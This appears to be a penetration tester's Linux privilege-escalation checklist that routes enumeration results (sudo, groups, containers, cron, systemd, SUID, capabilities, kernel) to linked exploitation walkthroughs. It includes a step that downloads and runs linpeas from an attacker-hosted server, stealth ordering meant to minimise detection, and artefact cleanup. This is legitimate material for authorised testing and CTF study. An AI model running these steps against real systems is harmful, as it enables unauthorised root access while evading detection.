
Routes user-level Linux foothold to PrivEsc walkthroughs. Pure router — exploitation content lives in `Linux PrivEsc Walkthroughs/`. Post-root activities (credential extraction, persistence, lateral movement) out of scope.

Ordering: stealth-then-yield, with crash-risk vectors deferred. Zero-IOC checks first; filesystem scans late; kernel exploits second-to-last (crash risk); linpeas last (max IOC). Operator may deviate in lab/CTF context.

---

## Step 0 — Trivial root attempt

`su -`

When prompted for password, hit Enter (blank).

- Prompt returns `#` → root achieved. Done.
- "Authentication failure" → proceed.

---

## Step 1 — Sudo and group privileges

### Sudo:

`sudo -l`

- sudo -l lists a binary for which a GTFOBins entry exists with a `Shell` function AND the Shell function has a populated `Sudo` tab → [[Sudo Shell Escape]]
- `env_keep` includes `LD_PRELOAD` OR `LD_LIBRARY_PATH` → [[Sudo Environment Variables]]
- Nothing usable → proceed

### Groups:

`id`

- `docker` in groups → [[Docker Socket Abuse]]
- `lxd` or `lxc` in groups → [[LXD Socket Abuse]]
- `disk` in groups → [[Disk Group Escape]]
- None → proceed

---

## Step 2 — Container attack surface

### In-container detection:

`cat /proc/1/cgroup 2>/dev/null | grep -E 'docker|lxc|kubepods' && echo "IN_CONTAINER" || (test -f /.dockerenv && echo "IN_CONTAINER" || echo "NOT_IN_CONTAINER")`

- `IN_CONTAINER` → [[Container Escape to Host Root]]
- `NOT_IN_CONTAINER` → proceed

### Docker socket:

`test -w /var/run/docker.sock && echo "DOCKER_SOCK_WRITABLE"`

- `DOCKER_SOCK_WRITABLE` → [[Docker Socket Abuse]]
- No output → proceed

### LXD socket:

`for s in /var/lib/lxd/unix.socket /var/snap/lxd/common/lxd/unix.socket; do test -w "$s" && echo "LXD_SOCK_WRITABLE: $s"; done`

- `LXD_SOCK_WRITABLE: <path>` → [[LXD Socket Abuse]]
- No output → proceed to Step 3

---

## Step 3 — Sensitive file permissions

### /etc/shadow & /etc/passwd:

`test -r /etc/shadow && echo "SHADOW READABLE" || echo "SHADOW NOT READABLE"`
`test -w /etc/passwd && echo "PASSWD WRITABLE" || echo "PASSWD NOT WRITABLE"`
`test -w /etc/shadow && echo "SHADOW WRITABLE" || echo "SHADOW NOT WRITABLE"` 

- `SHADOW READABLE` → [[Linux PrivEsc Walkthroughs/Readable Shadow|Readable /etc/shadow]]
- `PASSWD WRITABLE` → [[Linux PrivEsc Walkthroughs/Writable Passwd|Writable /etc/passwd]]
- `SHADOW WRITABLE` → [[Linux PrivEsc Walkthroughs/Writable Shadow|Writable /etc/shadow]]
- All three `NOT` → proceed

---

## Step 4 — Credential Harvesting

Read-only filesystem enum for credential-bearing artefacts. Stealth-positive — bash history of read commands is the only IOC.

1. [[History Files]]
2. [[Config Files]]
3. [[SSH Keys]]
4. [[Process cmdline & environ]] — *stub; skip. Build canonically when first encountered in the wild — walkthrough + `~/scripts/proc_enum.sh` covering `/proc/*/cmdline` and `/proc/*/environ`, parallel to History Files / Config Files / SSH Keys.*

All four exhausted with no elevation → proceed to Step 5.

---

## Step 5 — Scheduled execution

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/sched_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `WRITABLE_SCRIPT[root,cron]: <path>` → [[Cron File Permissions]], use `<path>` as `<script>`
- `WRITABLE_SCRIPT[root,anacron]: <path>` → [[Anacron File Permissions]]
- `WRITABLE_SCRIPT[root,at]: <path>` → [[At-job File Permissions]]
- `RELATIVE_CMD[root,cron]: <cmd>` AND `WRITABLE_PATH_DIR[cron]: <dir>` both present → [[Cron PATH]]
- `RELATIVE_CMD[root,anacron]: <cmd>` AND `WRITABLE_PATH_DIR[anacron]: <dir>` both present → [[Anacron PATH]]
- `RELATIVE_CMD[root,at]: <cmd>` AND `WRITABLE_PATH_DIR[at]: <dir>` both present → [[At-job PATH]]
- `WILDCARD[root,cron]: <dir>:<file>:<line>:<body>` → [[Cron Wildcards]]
- `WILDCARD[root,anacron]: <dir>:<file>:<line>:<body>` → [[Anacron Wildcards]]
- `WILDCARD[root,at]: <dir>:<file>:<line>:<body>` → [[At-job Wildcards]]
- No markers → no scheduled-execution PrivEsc route, proceed to Step 6

---

## Step 6 — Systemd hijacking 

⚠️ **Build-when-encountered.** `~/scripts/systemd_enum.sh` is deferred — no script body exists yet. On first real-box encounter of this step: build the script from first principles against the live target (which is the canonical validation context), conforming to the marker contract below. The marker contract is the locked architectural shape only — specific marker names and field structure are likely to refine when the script is built against real systemd output. 

Once `~/scripts/systemd_enum.sh` exists, invoke per the Step 4 pattern: 

On **attacker**: 

`(echo "bash <<'EOF'"; cat ~/scripts/systemd_enum.sh; echo "EOF") | xclip -selection clipboard` 

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.) 

Paste into target shell. 

Route on output markers: 
- `WRITABLE_TIMER[root]: <path>` → [[Systemd Timer File Permissions]] 
- `WRITABLE_SERVICE[root]: <path>` → [[Systemd Service File Permissions]] 
- `WRITABLE_SOCKET[root]: <path>` → [[Systemd Socket File Permissions]] 
- `WRITABLE_DROPIN[root]: <path>` → [[Systemd Drop-in File Permissions]] 
- `WRITABLE_EXECSTART[root]: <path>` → [[Systemd ExecStart Hijack]] 
- `WRITABLE_SYSTEMD_PATH_DIR[root]: <dir>` → [[Systemd PATH]] 
- No markers → no systemd-hijacking PrivEsc route, proceed to Step 7 
 
---
## Step 7 — Root-owned services

`ps -ef | awk '$1=="root" && $8 !~ /^\[/'`

- `mysqld` running as root → [[MySQL UDF]]
- `postgres` running as root → [[Postgres UDF]]
- `redis-server` running as root → [[Redis Configuration File Write]]
- `org.apache.catalina.startup.Bootstrap` in cmdline args, running as root → [[Tomcat Manager WAR Deploy]]
- Any other root-owned service → [[Service Known Exploits]]
- Nothing → proceed

> **Architectural note.** Enumeration filters to UID=root by design. The rare case of a non-root daemon with a CVE that directly grants root is excluded by this filter. If that case is ever encountered, the response is pre-decided: drop the awk root filter, rename the step, update inline bullets with explicit "running as root" qualifiers, broaden Service Known Exploits to UID-agnostic. **No re-deliberation.** Full reasoning in Vault_Strategy.md `Decisions held` — search "service known exploits root-gating decision".

---

## Step 8 — NFS exports

`cat /etc/exports 2>/dev/null`

- Shows an export with `no_root_squash` → [[NFS no_root_squash]]
- Empty / no `no_root_squash` line → move on to the next step.

---

## Step 9 — PATH abuse

`echo $PATH; for d in $(echo $PATH | tr ':' ' '); do test -w "$d" && echo "WRITABLE: $d"; done`

- Any directory in `$PATH` writable by current user → [[PATH Hijack]]
- None writable → proceed

---

## Step 10 — Capabilities

`getcap -r / 2>/dev/null`

(**Is there a coverage gap with this step, I think probably yes. This step enumerates FILE caps (`getcap -r /`), but does not enumerate RUNNING PROCESS caps (`getpcaps <pid>`)**). 

- `cap_setuid+ep` on standard binary (e.g. `/usr/bin/python3`, `/usr/bin/perl`) → [[Capability Abuse]]
- `cap_dac_read_search+ep` on accessible binary → [[Capability Abuse]]
- `cap_sys_admin+ep` on accessible binary → [[Capability Abuse]]
- Nothing → proceed

---

## Step 11 — SUID / SGID binaries

⚠️ High IOC. Full filesystem traversal — run once; the technique walkthroughs reuse this output, they do not re-run the `find`.

`find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null`

(No output → proceed to Step 12)

Try the below technique walkthroughs in stealth-first order. Each receives this list (the output from the above command), self-selects the binaries it applies to, loops them, and returns here on exhaustion to try the next:

1. [[SUID Known Exploits]]
2. [[SUID Shared Object Injection]]
3. [[SUID Environment Variables]]
4. [[SUID Function Export Hijack]]
5. [[SUID PS4 Debug Trace]]

All five exhausted with no elevation → proceed to Step 12.

---

## Step 12 — Kernel exploits

⚠️ Kernel exploits risk kernel panics — box may need reset. Run only after Steps 0–11 fall through.

`uname -r`

Record as `<kernel_version>` (e.g. `2.6.32-5-amd64`).

`for f in /etc/os-release /etc/debian_version /etc/redhat-release /etc/lsb-release /etc/issue; do echo "--- $f ---"; cat "$f" 2>/dev/null || echo "(absent)"; done`

From the populated files, identify and record `<distro>` (e.g. Debian, Ubuntu, RHEL, CentOS) and `<major_version>` (e.g. 6, 16, 7).

- Check in vault for `OS Exploit Index/Linux/<Distro> <Major version>.md`. If matching file, does the file's Applicable exploits table have a row matching `<kernel_version>` in the `Build` column AND `PrivEsc` in the `Stage` column → if yes, run that row's Walkthrough
- Otherwise → proceed

---

## Step 13 — Automated enumeration (linpeas)

⚠️ Maximum IOC. Comprehensive backstop.

### Transfer:

On **attacker** (in the linpeas directory):

`python3 -m http.server 8000`

On target:

`wget http://<lhost>:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh`

### Run:

`/tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas.out`

### Triage:

Focus on red+yellow flagged findings. Route each finding back to the appropriate step above (sudo / SUID / cron / etc.) for exploitation.

### Cleanup:

`rm /tmp/linpeas.sh /tmp/linpeas.out`

---

## Exhaustion

All fourteen steps fall through:

1. Re-review `linpeas.out` for less-common findings (kernel keyring, polkit, dbus, custom services).
2. Deeper enum on app-specific artefacts: `/var/spool/`, `/var/backups/`, `/opt/`, `/srv/`.
3. Reconsider scope — PrivEsc may require lateral movement first (login as another user via discovered SSH keys / passwords, then re-run this checksheet from that user's context).
